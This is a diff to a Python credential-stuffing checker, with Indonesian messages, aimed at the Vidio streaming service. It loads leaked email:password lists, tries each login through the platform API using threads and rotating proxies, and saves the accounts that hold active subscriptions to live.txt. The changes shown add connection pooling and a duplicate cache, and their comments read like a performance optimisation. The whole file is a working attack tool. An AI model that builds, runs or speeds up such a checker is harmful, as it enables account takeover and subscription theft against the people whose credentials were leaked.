@@ -3,6 +3,7 @@ import os
 import re
 import uuid
 import requests
+from requests.adapters import HTTPAdapter
 from colorama import Fore, init
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
@@ -15,12 +16,15 @@ xApiInfo_vidio = "tv-android/10/2.46.10-743"
 
 # Lock global untuk operasi file agar thread-safe
 file_lock = Lock()
+# Cache untuk menyimpan akun yang sudah tersimpan agar tidak perlu membaca file berulang kali
+# Optimization: Memory cache (set) for O(1) duplicate checks vs O(N) disk reads
+saved_accounts_cache = {}
 
 def session_id():
     return str(uuid.uuid4())
 
 
-def fungsi_login(email, password, proxy_manager: ProxyManager = None, max_retries: int = 3):
+def fungsi_login(email, password, session: requests.Session, proxy_manager: ProxyManager = None, max_retries: int = 3):
     headers = {
         "X-Api-Platform": "tv-android",
         "X-Api-Auth": X_API_AUTH,
@@ -41,7 +45,8 @@ def fungsi_login(email, password, proxy_manager: ProxyManager = None, max_retrie
 
     while attempt < max_retries:
         try:
-            response = requests.post(url, headers=headers, data=param, timeout=10, proxies=current_proxy)
+            # Use session.post to leverage connection pooling
+            response = session.post(url, headers=headers, data=param, timeout=10, proxies=current_proxy)
             if response.status_code == 200:
                 return response
         except requests.RequestException as e:
@@ -55,7 +60,7 @@ def fungsi_login(email, password, proxy_manager: ProxyManager = None, max_retrie
     return None
 
 
-def fungsi_get_subs(user_token, email):
+def fungsi_get_subs(user_token, email, session: requests.Session):
     headers = {
         "x-user-email": email,
         "x-user-token": user_token,
@@ -74,7 +79,7 @@ def fungsi_get_subs(user_token, email):
 
     url = "https://api.vidio.com/api/users/has_active_subscription?device=polytron%20h2"
     try:
-        response = requests.get(url, headers=headers, timeout=10)
+        response = session.get(url, headers=headers, timeout=10)
         response.raise_for_status()
         result = response.json()
         return "ACTIVE" if result.get("has_active_subscription") else "INACTIVE"
@@ -85,14 +90,19 @@ def fungsi_get_subs(user_token, email):
 def save_to_file(email, password, filename="live.txt"):
     entry = f"{email}:{password}"
     with file_lock:
-        if os.path.exists(filename):
-            with open(filename, "r") as f:
-                data = f.read().splitlines()
-            if entry in data:
-                print(Fore.YELLOW + f"[!] {email} sudah ada di file.")
-                return
+        if filename not in saved_accounts_cache:
+            saved_accounts_cache[filename] = set()
+            if os.path.exists(filename):
+                with open(filename, "r") as f:
+                    saved_accounts_cache[filename].update(f.read().splitlines())
+
+        if entry in saved_accounts_cache[filename]:
+            print(Fore.YELLOW + f"[!] {email} sudah ada di file.")
+            return
+
         with open(filename, "a") as f:
             f.write(entry + "\n")
+        saved_accounts_cache[filename].add(entry)
     print(Fore.GREEN + f"[✓] {email} disimpan ke file.")
 
 
@@ -106,6 +116,9 @@ def parse_credentials(line: str):
     return parts[1].strip(), parts[2].strip()
 
 
+# Global adapter for connection pooling
+global_adapter = None
+
 def proses_satu_akun(line, proxy_manager, output_file):
     email, password = parse_credentials(line)
     if not email or not password:
@@ -113,25 +126,39 @@ def proses_satu_akun(line, proxy_manager, output_file):
         return
     print(Fore.CYAN + f"[•] Proses login {email}")
 
-    login_response = fungsi_login(email=email, password=password, proxy_manager=proxy_manager)
-    if login_response:
-        data = login_response.json()
-        user_token = data.get("auth", {}).get("authentication_token")
-        user_email = data.get("auth", {}).get("email")
+    # Create a local session for this thread/account to isolate cookies
+    session = requests.Session()
+    # Mount the global adapter to reuse TCP connections
+    if global_adapter:
+        session.mount("https://", global_adapter)
+        session.mount("http://", global_adapter)
 
-        if user_token and user_email:
-            subs = fungsi_get_subs(user_token, user_email)
-            if subs == "ACTIVE":
-                print(Fore.GREEN + f"[✓] {email} Langganan Aktif")
-                save_to_file(email, password, filename=output_file)
-            elif subs == "INACTIVE":
-                print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
+    try:
+        login_response = fungsi_login(email=email, password=password, session=session, proxy_manager=proxy_manager)
+        if login_response:
+            data = login_response.json()
+            user_token = data.get("auth", {}).get("authentication_token")
+            user_email = data.get("auth", {}).get("email")
+
+            if user_token and user_email:
+                subs = fungsi_get_subs(user_token, user_email, session=session)
+                if subs == "ACTIVE":
+                    print(Fore.GREEN + f"[✓] {email} Langganan Aktif")
+                    save_to_file(email, password, filename=output_file)
+                elif subs == "INACTIVE":
+                    print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
+                else:
+                    print(Fore.RED + f"[!] {email} Gagal cek langganan")
             else:
-                print(Fore.RED + f"[!] {email} Gagal cek langganan")
+                print(Fore.RED + f"[!] {email} Login OK tapi token/email hilang")
         else:
-            print(Fore.RED + f"[!] {email} Login OK tapi token/email hilang")
-    else:
-        print(Fore.RED + f"[X] Login gagal untuk {email}")
+            print(Fore.RED + f"[X] Login gagal untuk {email}")
+    except Exception as e:
+        print(Fore.RED + f"[!] Error processing {email}: {e}")
+    # Note: Do NOT call session.close() here as it closes the shared global_adapter
+    # which breaks the connection pool for all other threads.
+    # The session object is local and will be garbage collected,
+    # but the adapter (and its pool) persists.
 
 
 def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None, workers: int = 20, output_file="live.txt"):
@@ -148,6 +175,10 @@ def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None, worker
             lines = f.read().splitlines()
 
     print(Fore.BLUE + f"[•] Total akun: {len(lines)} — memproses dengan {workers} thread...")
+
+    # Initialize global adapter
+    global global_adapter
+    global_adapter = HTTPAdapter(pool_connections=workers, pool_maxsize=workers)
 
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [executor.submit(proses_satu_akun, line, proxy_manager, output_file) for line in lines]
